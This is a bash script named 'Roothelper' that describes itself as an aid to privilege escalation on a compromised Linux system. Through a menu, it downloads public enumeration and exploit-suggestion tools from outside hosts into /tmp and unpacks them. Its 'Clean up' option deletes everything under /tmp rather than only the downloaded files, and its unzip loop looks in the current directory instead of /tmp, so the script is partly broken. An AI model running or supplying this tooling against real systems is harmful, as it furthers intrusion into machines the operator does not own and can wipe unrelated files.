#!/bin/bash

function usage()
{ printf "%b \a\n\nRoothelper will aid in the process of privilege escalation on a Linux system you compromised by fetching a number of enumeration
and exploit suggestion scripts. Below is a quick overview of the available options.

The 'Help' option displays this informational message.

The 'Download' option fetches the relevant files and places them in the /tmp/ directory.

The option 'Download and unzip' downloads all files and extracts the contents of zip archives to their individual subdirectories respectively, please
note; if the 'mkdir' command is unavailable however, the operation will not succeed and the 'Download' option should be used instead

The 'Clean up' option removes all downloaded files and 'Quit' exits roothelper.\n "
}

# Download and unzip
function dzip()
{    echo "Downloading and extracting scripts..."
    `wget -O /tmp/ExploitSuggest.py http://www.securitysift.com/download/linuxprivchecker.py`
    `wget -O /tmp/LinEnum.zip https://github.com/rebootuser/LinEnum/archive/master.zip`                  
    `wget -O /tmp/ExploitSuggest_perl.zip https://github.com/PenturaLabs/Linux_Exploit_Suggester/archive/master.zip`  
    `wget -O /tmp/unixprivesc.zip https://github.com/pentestmonkey/unix-privesc-check/archive/1_x.zip`
    `wget -O /tmp/firmwalker.zip https://github.com/craigz28/firmwalker/archive/master.zip`
    for zip in *.zip
    do
        dirname=`echo $zip | sed 's/\.zip$//'`
        if mkdir $dirname
        then
            if cd $dirname
            then
                unzip ../$zip
                cd ..
                rm -f $zip
            else
                echo "Could not unpack $zip - cd failed"
            fi
        else
            echo "Could not unpack $zip - mkdir failed"
        fi
    done
}

dir="/tmp/"

usage

printf "%b" "\a\n\nTo use roothelper please select an option below.:\n"

PS3='Please enter your choice: '
options=("Help" "Download" "Download and unzip" "Clean up" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Help")
            usage
            printf "%b \n"
            ;;
        "Download")
            echo "Downloading scripts to /tmp/"
            `wget -O /tmp/ExploitSuggest.py http://www.securitysift.com/download/linuxprivchecker.py`
            `wget -O /tmp/LinEnum.zip https://github.com/rebootuser/LinEnum/archive/master.zip`                  
            `wget -O /tmp/ExploitSuggest_perl.zip https://github.com/PenturaLabs/Linux_Exploit_Suggester/archive/master.zip`
            `wget -O /tmp/unixprivesc.zip https://github.com/pentestmonkey/unix-privesc-check/archive/1_x.zip`
            `wget -O /tmp/firmwalker.zip https://github.com/craigz28/firmwalker/archive/master.zip`
             printf "%b \n"
            ;;
        "Download and unzip")
            dzip
            printf "%b \n"
            ;;
         "Clean up")
            echo "Removing downloaded files"
            find $dir/* -exec rm {} \;
            printf "%b \n"
            ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
  
